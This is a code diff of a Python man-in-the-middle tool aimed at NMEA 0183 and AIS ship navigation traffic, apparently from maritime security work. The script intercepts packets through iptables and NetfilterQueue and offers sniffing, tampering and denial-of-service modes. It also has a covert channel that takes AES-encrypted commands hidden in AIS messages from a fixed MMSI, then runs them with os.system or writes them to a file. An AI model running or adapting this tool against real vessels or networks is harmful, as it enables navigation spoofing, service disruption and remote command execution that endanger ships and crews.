@@ -2,7 +2,7 @@
 Script to perform MITM on NMEA 0183 serial commnuication
 This scipt will allow evasdroping and packet manipulation of NMEA sentence
 '''
-from struct import pack
+from Crypto.Cipher import AES
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import os
@@ -11,12 +11,13 @@ from pyais import *
 from NMEA import NMEA
 import json
 from Attributes import attributes
-from Crypto.Cipher import AES
+#from Crypto.Cipher import AES
 
 gps_attr_targets = None
 
 class MITM:
     def __init__(self, target_ip,  src_ip, option, config_data = None):
+        
         self.target_ip = target_ip
         self.src_ip = src_ip
         self.src_mac = None
@@ -30,21 +31,25 @@ class MITM:
         self.KEY = b"sixteen byte key"
 
         # AIS CC, parameters
-        self.decrypt_cipher = AES.new(self.KEY, AES.MODE_EAX, nonce = self.KEY)
+        # self.decrypt_cipher = AES.new(self.KEY, AES.MODE_EAX, nonce = self.KEY)
         self.sentence_count = 0
         self.trigger_received = False
         self.received_cipher =  ""
-        self.option = None
+        self.cc_option = None
         self.filename  = None
 
     def ais_cc(self, packet):
+        #print(f"[*] Running in AIS CC mode")
         pkt = packet.get_payload()
         pktIP = IP(pkt)
             
         payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
-        sentence_type = payload.split(",")[0][1:]
-            
-        if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000 and sentence_type == "AIVDM":
+        payload_split = payload.split(",")
+        sentence_type = payload_split[0][1:]
+        if sentence_type == "AIVDM":
+            num_of_fragments = int(payload_split[1])
+        #print(payload, payload_split)    
+        if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000 and sentence_type == "AIVDM" and num_of_fragments == 1:
             print("-"*20)
             print(f"[*] AIS Packet Intercepted with payload \n{payload}")
     
@@ -52,36 +57,39 @@ class MITM:
             nmea_ais.decode()
             decoded_ais = nmea_ais.data #['data'].decode()
 
-            if trigger_received and decoded_ais['msg_type'] == 8 and decoded_ais['mmsi'] == 366053209 and sentence_count != 0:
-                received_cipher += decoded_ais['data'].decode()
-                sentence_count -= 1
+            if self.trigger_received and decoded_ais['msg_type'] == 8 and decoded_ais['mmsi'] == 366053209 and self.sentence_count != 0:
+                self.received_cipher += decoded_ais['data'].decode()
+                self.sentence_count -= 1
             
-            if trigger_received and sentence_count == 0:
-                received_cipher = bytes.fromhex(received_cipher)
-                plaintext = self.decrypt_cipher.decrypt(received_cipher)
-                print(f"[*] Payload decryped and decoded")
-                if option == "CMD":
+            if self.trigger_received and self.sentence_count == 0:
+                self.received_cipher = bytes.fromhex(self.received_cipher)
+                decrypt_cipher = AES.new(self.KEY, AES.MODE_EAX, nonce = self.KEY)
+                plaintext = decrypt_cipher.decrypt(self.received_cipher)
+                data = plaintext if self.cc_option == "CMD" else self.filename
+                print(f"[*] Payload decryped and decoded......{data}")
+                if self.cc_option == "CMD":
                     print(f"[*] Executing command")
                     os.system(plaintext.decode())
-                if option == "FILE":
-                    print(f"[*] Writing payload to file....{filename}")
-                    out_file = open(filename,'w')
+                if self.cc_option == "FILE":
+                    print(f"[*] Writing payload to a file....{self.filename}")
+                    out_file = open(self.filename,'w')
                     out_file.write(plaintext.decode())
                     out_file.close()
                 
-                trigger_received = False
+                self.trigger_received = False
+                self.received_cipher = ""
         
-            if decoded_ais['msg_type'] == 8 and decoded_ais['mmsi'] == 366053209 and not trigger_received:
+            if decoded_ais['msg_type'] == 8 and decoded_ais['mmsi'] == 366053209 and not self.trigger_received:
                 data = str(decoded_ais['data'].decode()).split(":")
                 if len(data) >= 3 and data[0] == "CCSTART":
-                    option = data[1]
-                    sentence_count = int(data[2])
-                    trigger_received = True
-                    if option == "FILE":   
-                        filename = data[3]
-                    print(f"[*] Trigger received, waiting for {option}")
+                    self.cc_option = data[1]
+                    self.sentence_count = int(data[2])
+                    self.trigger_received = True
+                    if self.cc_option == "FILE":   
+                        self.filename = data[3]
+                    print(f"[*] Trigger received, waiting for {self.cc_option}")
 
-            packet.accept()
+        packet.accept()
 
     def sniff(self, packet):
             print("[*] Running Sniffing Attack")
@@ -208,16 +216,19 @@ class MITM:
     def setup(self):
         iptable_config = f"sudo iptables -A FORWARD -j NFQUEUE --queue-num 0 -d {self.target_ip}"
         os.system(iptable_config)
+        #print(self.option)
         if self.option == "M":
             self.nfqueue.bind(0, self.modify)
         elif self.option == "A":
             self.nfqueue.bind(0, self.stealth)
         elif self.option == "S":
             self.nfqueue.bind(0, self.sniff)
+            print("[*] Running in Sniff mode")
         elif self.option == "D":
             self.nfqueue.bind(0, self.dos) 
         elif self.option == "C":
             self.nfqueue.bind(0, self.ais_cc)
+            print("[*] Running in AIS CC")
 
     def clean_up(self):
         print("[*] Flushing iptables")
@@ -254,7 +265,6 @@ if __name__ == '__main__':
     # elif args.option == "I" and not args.filename:
     #     print("No input file specified for injection")
     #     exit()
-
     mitm = MITM(args.target_ip, args.source_ip, args.option, read_config(args.config) if args.config else None)
     mitm.setup()
     
